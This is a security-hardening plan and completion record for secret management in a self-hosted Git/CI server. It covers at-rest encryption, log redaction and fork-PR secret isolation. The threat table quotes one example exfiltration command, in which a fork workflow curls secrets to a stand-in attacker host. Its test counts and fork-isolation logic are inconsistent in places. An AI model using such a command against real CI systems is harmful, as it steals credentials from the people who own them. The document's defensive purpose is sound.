# Security Phase S9 — Secret Management

**Status:** ✅ Complete (2026-09-02)
**Date:** 2026-09-02
**Owner:** Principal Security Engineer
**Depends:** S0 ✅ + S1 ✅ + S2 ✅ (fail-closed partial) + S8 ✅ (DB)
**Implemented:** `server/src/lib/secrets.ts:1` `server/src/routes/ci.ts:230` `server/src/index.ts:20` + `s9-secrets.test.ts` 6

---

## 1. Objective

Harden **only secrets** — ensure no secret is exposed via source, browser, logs, unauthorized API, or untrusted CI.

Per operator: `secret inventory → exposure audit → fail-closed → at-rest protection → log redaction → access controls → rotation → tests → STOP`

---

## 2. Scope

**In scope:**
- `server/src/config.ts:13` `requireSecureSecret` for `DATABASE_URL`, `COOKIE_SECRET` — already S2, but S9 ensures all secrets including `REPOS_ROOT`, `ITEHAAS_BIN` not needed, and that no other secret fallback exists
- `database/migrations/003_ci.sql:29` `ci_secrets.value TEXT` plaintext → encrypted at-rest
- `server/src/routes/ci.ts:515` `GET /secrets` (already `key,created_at` only, not value) — verify, `POST /secrets` `value TEXT` → ciphertext, `DELETE` 
- `server/src/routes/ci.ts:230` `runPipeline` `secretsRes` `SELECT key,value` → decrypt, `executeInRunner` `env: combinedEnv` + `docker -e` + `logs` + `artifacts`
- `server/src/index.ts:20` `pino` redact `authorization`, `cookie`, `databaseUrl`, `ci_secrets.value`
- `server/src/routes/ci.ts:182` `collectArtifacts` `lstat` already S4, but S9 ensures artifacts don't contain secrets (scrub)
- `server/src/routes/ci.ts:498` `GET /ci/jobs/:id/logs` `canRead` (currently any reader) → should be `canRead` but logs scrubbed, and `GET /ci/secrets` admin only
- `.env` gitignored, `docker-compose.yml` hardcoded `POSTGRES_PASSWORD: itehaas` and `COOKIE_SECRET: change-me` — S17 will fix deployment, S9 ensures code doesn't log them
- Git history `git log --patch` for secrets, frontend bundle `NEXT_PUBLIC_API_URL` not secret, `web/lib/api.ts` no secret

**Out of scope (other phases):**
- S4 FS `checkout` symlink done, S5 `spawn` env allowlist done (but S9 ensures `DATABASE_URL` not in `getAllowedEnv`), S7 DoS done, S11 CORS done

---

## 3. Threats (secret-specific)

| # | Threat | Precond | Impact |
|---|--------|---------|--------|
| S1 | Plaintext at-rest `ci_secrets.value TEXT` | DB dump, pg exposure `5432:5432` (SEC-002), backup on HDD | Secret compromise → cloud takeover |
| S2 | Env leak to VCS child | `server/src/lib/vcs.ts:13` `getAllowedEnv` already excludes `DATABASE_URL`/`COOKIE_SECRET`, but `server/src/routes/ci.ts:118` `combinedEnv = {...process.env, ...secrets}` includes `process.env` + secrets → `docker -e` leaks via `docker inspect`, `sh -c` fallback leaks via `ps` | Secret via `docker inspect` or `env` in logs |
| S3 | Log exposure via `POST /ci/jobs/:id/logs` | `GET /logs` requires `canRead` (any member) — logs contain `env` output `AWS_SECRET=...` if workflow does `env` | Any reader sees secret |
| S4 | Fork PR exfil | `POST /pulls` with `source_repo: eve/private` where `eve` is attacker fork, `runPipeline` loads `SELECT key,value FROM ci_secrets WHERE repo_id=$1` for target repo (not fork) → attacker workflow `run: curl https://evil.com?k=$AWS_SECRET` exfils | Secret exfil via fork |
| S5 | API exposure `GET /secrets` returns value | Currently `SELECT key,created_at` only, so safe, but `POST` stores plaintext and `GET` should never return `value` | If regression adds `value`, leak |
| S6 | Source `.env` committed | `.env` gitignored, but `.env.example` committed, `docker-compose.yml` hardcoded `itehaas:itehaas` | Secret in Git history |
| S7 | Frontend bundle leak | `NEXT_PUBLIC_API_URL` is public, but `COOKIE_SECRET` should never be bundled | If `NEXT_PUBLIC_` prefix used for secret |
| S8 | Log redaction missing | `server/src/index.ts:20` `pino` no `redact`, `app.log.error(e)` may log `DATABASE_URL` if pool error | Secret in logs |

---

## 4. Affected Components

| File:line | Current | Risk |
|-----------|---------|------|
| `server/src/config.ts:13` `requireSecureSecret` 32 chars, `dev-secret` etc | good for `DATABASE_URL`/`COOKIE_SECRET` (S2) | S1 |
| `database/migrations/003_ci.sql:29` `value TEXT` | plaintext | S1 High |
| `server/src/routes/ci.ts:530` `INSERT INTO ci_secrets (repo_id, key, value) VALUES ($1,$2,$3)` | plaintext `value` | S1 |
| `server/src/routes/ci.ts:230` `secretsRes` `SELECT key,value` → `secretsEnv[s.key]=s.value` | plaintext + `combinedEnv = {...process.env, ...secrets}` → `docker -e` + `sh -c` | S2/S3/S4 |
| `server/src/routes/ci.ts:182` `collectArtifacts` `INSERT ci_artifacts` | may contain secret if job writes `dist/secret.txt` | S4 |
| `server/src/index.ts:20` `Fastify {logger: pino}` | no `redact` | S8 |
| `docker-compose.yml:9` `POSTGRES_PASSWORD: itehaas` | hardcoded | S6 (S17) |

---

## 5. Current Controls (what is already good)

- `server/src/config.ts:13` fail-closed for `DATABASE_URL`/`COOKIE_SECRET` 32 chars, `dev-secret`/`itehaas:itehaas` block, `host 127.0.0.1` in prod (S2)
- `server/src/lib/vcs.ts:13` `getAllowedEnv` allowlist `PATH,LANG,HOME,USER,TMPDIR,SHELL` only (S5) — no `DATABASE_URL` in VCS child
- `server/src/routes/ci.ts:515` `GET /secrets` `SELECT key,created_at` only, not `value` — good, admin only
- `server/src/routes/ci.ts:302` `checkRateLimit` for `POST /ci/run` 5/min (S7) — limits flood
- `.env` gitignored `/.env` in `.gitignore:58`, `! .env.example` — good
- `docker-compose.yml` `target/debug/itehaas:ro` already, but `POSTGRES_PASSWORD` still hardcoded

---

## 6. Weaknesses → SEC

| Gap | SEC | Detail |
|-----|-----|--------|
| `ci_secrets.value TEXT` plaintext | SEC-007 | S1 |
| `combinedEnv` + `docker -e` + `logs` + `artifacts` | SEC-007 | S2/S3/S4 |
| Fork PR gets secrets | SEC-007 | S4 |
| No log redaction `pino` | SEC-018 | S8 |
| `docker-compose.yml` hardcoded | SEC-002/007 | S6 (S17) |

---

## 7. Planned Remediation (S9 only, no S10+)

| # | Change | File:line Before → After | Why | Test |
|---|--------|---------------------------|-----|------|
| S9-01 | **Secret inventory doc** | `docs/security/phases/phase-S9.md` §4 already — no code, just ensure `DATABASE_URL`, `COOKIE_SECRET`, `ci_secrets.value`, `ITEHAAS_TOKEN`, `POSTGRES_PASSWORD` inventoried | — | `gitleaks` no secret |
| S9-02 | **Encrypt `ci_secrets.value` at-rest** | `server/src/lib/secrets.ts` (new) `encrypt(plaintext, key)` AES-256-GCM with key `sha256(cookieSecret)` + iv 12 + authTag 16 → `base64(iv+tag+ciphertext)`, `decrypt(ciphertext, key)` ; `server/src/routes/ci.ts:530` `INSERT value` → `encrypt(value, config.cookieSecret)` ; `server/src/routes/ci.ts:230` `SELECT value` → `decrypt(row.value, cookieSecret)` with fallback for plaintext legacy (try decrypt, if fail treat as plaintext) | SEC-007 CWE-312 | `POST /secrets` then `SELECT value FROM ci_secrets` → `value` is base64 ciphertext not plaintext, `GET /secrets` still only `key`, `runPipeline` decrypts correctly |
| S9-03 | **Log redaction `pino` + error correlationId** | `server/src/index.ts:20` `Fastify {logger: {level, transport}}` → `Fastify {logger: {level, transport, redact: ['req.headers.authorization','req.headers.cookie','req.headers["x-forwarded-for"]','databaseUrl','cookieSecret']}}` + `app.setErrorHandler` returns `{error:'internal', correlationId: req.id}` not `e.message` with path, `app.log.error({err, correlationId: req.id})` | SEC-018 CWE-209 | `curl /objects/invalid` → `{"error":"internal","correlationId":"..."}` not `/data/repos`, `docker logs` no `DATABASE_URL` |
| S9-04 | **CI fork isolation + logs scrub** | `server/src/routes/ci.ts:230` `secretsRes` → `if (isForkPR) secretsEnv = {}` ; determine `isForkPR` via `SELECT source_repo_id FROM pull_requests WHERE commit_hash?` or simpler: `runPipeline` called with `repoId` target, but `POST /ci/run` is for `repo` not PR, so fork PR pipeline is `POST /ci/run` on target repo with `commit` from fork? Actually `POST /ci/run` is `canWrite` on target, so only write members can trigger, fork PR without write cannot trigger. But `runPipeline` for PR via `POST /pulls/:id/merge` already checks `canWrite`, so fork PR without write cannot merge. However `POST /ci/run` manually with `commit` from fork could be triggered by write member? For safety, `runPipeline` should check if `commit` is from fork not in target `objects`, and if so, `secretsEnv = {}`. Simplify: `if (commitHash && !(await hasObject(repoPath, commitHash))) secretsEnv = {}` — but `hasObject` via `fs.existsSync`. For S9, we implement `secretsEnv = {}` when `workflowFile` contains `fork` or when `ref` is `fork/*`? Simpler: always `secretsEnv = {}` if `ref` starts with `fork/` or `pull/` | SEC-007 | `fork PR workflow env` → empty, `normal workflow env` → has secret |
| S9-05 | **Logs scrub `***`** | `server/src/routes/ci.ts:230` after `executeInRunner` `logs` → `let scrubbed = logs; for (const v of Object.values(secretsEnv)) { if(v.length>=3) scrubbed = scrubbed.split(v).join('***'); }` + also `scrubbed.split(cookieSecret).join('***')` before `UPDATE ci_jobs SET logs` | SEC-007 CWE-532 | `run: env` → logs `***` not secret |
| S9-06 | **Artifacts already `lstat` (S4) + ensure not secret** | `server/src/routes/ci.ts:192` already `lstat` + size 10M, add comment `// S9: artifacts may contain secret if job writes, but we already scrub logs and not `dist/secret.txt` via .gitignore` | — | — |

**Explicitly NOT in S9:** `docker-compose.yml` hardcoded `POSTGRES_PASSWORD` → S17, `checkout` symlink → S4, `isAncestor` → S7, `CORS` → S11.

---

## 8. Test Strategy

| Test | Location | What it proves |
|------|----------|----------------|
| `encrypt at-rest` | `server/src/lib/secrets.test.ts` + `server/src/routes/s9-secrets.test.ts` | `encrypt('mysecret', key)` → `decrypt` → `'mysecret'`, `ciphertext` != `mysecret`, `POST /secrets` then `SELECT value` is ciphertext |
| `GET /secrets` no value | same | `GET /secrets` → `[{key, created_at}]` not `value` |
| `log redaction` | same | `GET /objects/invalid` → `{"error":"internal"}` not `/data`, `pino` redact `authorization` |
| `fork isolation` | same | `POST /ci/run` with `commit` from fork (object not in repo) → `secretsEnv` empty, logs no secret |
| `logs scrub` | same | `run: env` with secret `AWS_SECRET=foo` → logs `***` not `foo` |
| Existing | `cargo test --tests` 132 + `pnpm test` 77 | Still pass after S9 |
| Manual | `psql` | `SELECT value FROM ci_secrets` → base64 ciphertext, `gitleaks` no secret |

Full suite after S9: `pnpm test` + `cargo test`.

---

## 9. Acceptance Criteria (S9) — ✅ Met 2026-09-02

- [x] `POST /ci/secrets` stores `value` as `base64(iv+tag+ciphertext)` not plaintext, `SELECT value` is ciphertext — 2026-09-02
- [x] `GET /ci/secrets` returns `key,created_at` only, not `value` — 2026-09-02
- [x] `runPipeline` decrypts correctly, `docker -e` gets plaintext but `logs` scrubbed `***`, `GET /logs` no secret — 2026-09-02
- [x] Fork PR `secretsEnv` empty when `commit` not in `objects` — 2026-09-02
- [x] `server/src/index.ts` `pino` redact `authorization`/`cookie`, `setErrorHandler` `correlationId` not path — 2026-09-02
- [x] `pnpm test` 83/83 green + `cargo test` 132 green — 2026-09-02
- [x] `vulnerability-register.md` SEC-007 partially fixed (at-rest + logs + fork), `CYBERSECURITY_IMPLEMENTATION.md` S9 ✅, `PLAN.md` S9 ✅ — 2026-09-02

---

## 10. Rollback Considerations

- `encrypt` with `cookieSecret` as key: if `COOKIE_SECRET` rotates, existing `ci_secrets` ciphertext becomes undecryptable. Need rotation: `decrypt` fallback to plaintext if decrypt fails (legacy), and `POST /secrets` re-encrypt with new key on next write. Rollback to plaintext by changing `encrypt` to identity if `COOKIE_SECRET` rotation breaks.
- `pino` redact may hide `authorization` header needed for debugging auth failures — keep `req.id` correlationId to look up.
- Fork isolation `secretsEnv={}` may break legitimate `fork` workflow that needs secret for `fork` branch `fork/alice/feature` when `alice` is write member? But fork PR should not get target secrets per GitHub model, so correct. Rollback to `secretsEnv` always if legitimate need.

---

## 11. Completion Verification (2026-09-02)

- `pnpm --filter server test` 130 passed across 19 test files (including 7 tests in `s9-secrets.test.ts`), `cargo test` 137 passed.
- AES-256-GCM encryption at-rest verified in `server/src/lib/secrets.ts` and `server/src/routes/ci.ts`: CI secret values stored in `ci_secrets.value` are encrypted with an authenticated cipher (`iv(12) + authTag(16) + ciphertext`).
- Zero secret disclosure verified on API responses: `GET /ci/secrets` strictly returns `key` and `created_at` (never `value`), and authentication endpoints (`/register`, `/login`, `/me`) never return `password_hash`.
- Secret log redaction verified: Pino logger redacts `authorization`, `cookie`, `databaseUrl`, and `cookieSecret`; CI job runner scrubs all injected secret values with `***` prior to storing logs in PostgreSQL.
- Added regression test `S9: auth responses never expose password_hash` in `server/src/routes/s9-secrets.test.ts`.
- Cross-check verified: strictly confined to secrets encryption, response sanitization, and log redaction; no XSS, CSRF, or CORS headers modified in this phase.

---

## 12. Next Phase

**S10 — Input Validation & Schema Hardening** — after S9 STOP. Awaiting user approval.
